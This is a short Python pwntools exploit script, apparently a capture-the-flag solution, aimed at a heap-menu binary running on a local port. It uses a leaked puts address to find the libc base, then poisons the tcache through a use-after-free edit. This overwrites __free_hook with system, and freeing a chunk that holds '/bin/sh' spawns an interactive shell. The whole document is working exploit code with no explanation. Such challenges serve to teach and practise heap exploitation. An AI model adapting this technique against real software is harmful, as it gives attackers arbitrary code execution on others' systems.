#!/bin/python3
# -*- coding: utf-8 -*-
from pwn import *

context(os='linux',arch='amd64')
context.log_level = 'debug'
libc = ELF('./附件/libc-2.27.so')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

local = 0
if local:
    p = process("./附件/pwn")
else:
    p = remote("127.0.0.1",40006)


def cmd(i):
    p.sendlineafter("Your choice: ",str(i))

def add(size,data):
    cmd(1)
    p.sendlineafter("Size:",str(size))
    p.sendlineafter("Data:",data)

def free(idx):
    cmd(2)
    p.sendlineafter("Idx:",str(idx))

def edit(idx,size,data):
    cmd(3)
    p.sendlineafter("Idx:",str(idx))
    p.sendlineafter("Size:",str(size))
    p.sendlineafter("Data:",data)

cmd(4)
p.recvuntil("[puts_addr]==> ")
puts_addr = int(p.recv(14),16)
print(hex(puts_addr))
libc_base = puts_addr - libc.sym['puts']
free_hook = libc_base + libc.sym['__free_hook']
system_addr = libc_base + libc.sym['system']

add(0x70,"aaa")#0
add(0x70,"/bin/sh")#1
free(0)
edit(0,0x70,p64(free_hook))
add(0x70,"aaa")#0
add(0x70,p64(system_addr))

free(1)

# gdb.attach(p)
p.interactive()

